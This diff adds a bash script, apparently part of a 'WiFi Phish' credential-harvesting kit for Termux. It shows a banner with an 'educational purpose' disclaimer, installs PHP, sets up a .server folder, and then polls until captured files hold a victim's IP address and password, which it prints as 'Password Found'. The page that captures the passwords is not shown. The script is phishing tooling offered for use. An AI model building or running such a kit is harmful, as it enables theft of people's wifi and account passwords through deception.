@@ -1,0 +1,77 @@
+#!/bin/bash
+
+rd="\e[1;31m"
+gr="\e[1;32m"
+yl="\e[1;33m"
+cy="\e[1;36m"
+wht="\e[0m"
+
+banner(){
+
+echo -e ${gr}
+
+echo -e "       _  _  _ _ ${rd}______  _     _      _     ${gr}"
+echo -e "      (_)(_)(_|_${rd}|_____ \| |   (_)    | |    ${gr}"
+echo -e "       _  _  _ _${rd} _____) ) |__  _  ___| |__  ${gr}"
+echo -e "      | || || | ${rd}|  ____/|  _ \| |/___)  _ \ ${gr}"
+echo -e "      | || || | ${rd}| |     | | | | |___ | | | |${gr}"
+echo -e "       \_____/|_${rd}|_|     |_| |_|_(___/|_| |_|${gr}"
+echo
+echo -e "${gr}      --------------------------------------"
+echo -e "${rd}  -----          ${wht}- By: Mr Idealhat         ${rd}-----"
+echo -e "${gr}      --------------------------------------"
+echo
+
+echo -e "${yl}NOTE: ${rd}Use this tool only for educational purpose!"
+
+}
+
+
+depend(){
+
+    if [ ! -d .server ]; then
+	mkdir .server
+    fi
+
+    if [ -f .server/pass.txt ]; then
+	rm .server/pass.txt
+    fi
+
+    if [ -f .server/ip.txt ]; then
+	rm .server/ip.txt
+    fi
+
+    if [ ! -f $PREFIX/bin/php ]; then
+	echo -e "${rd}[${yl}!${rd}] ${gr}Installing dependency...!"
+	apt-get install php -y
+	clear
+	setup
+    fi
+
+}
+
+
+check_pass(){
+
+    if [ -f .server/pass.txt ]; then
+	echo -e "\n${rd}[${yl}!${rd}] ${gr}IP Address: ${wht}$( cat .server/ip.txt )\n"
+	echo -e "${rd}[${yl}!${rd}] ${gr}Password Found: ${wht}$( cat .server/pass.txt )\n"
+    else
+	sleep 1
+	check_pass
+    fi
+
+}
+
+
+setup(){
+    banner
+    depend
+    echo
+    echo -e "${rd}[${yl}!${rd}] ${yl}Waiting for credentials...!"
+    echo
+    check_pass
+}
+
+
+setup
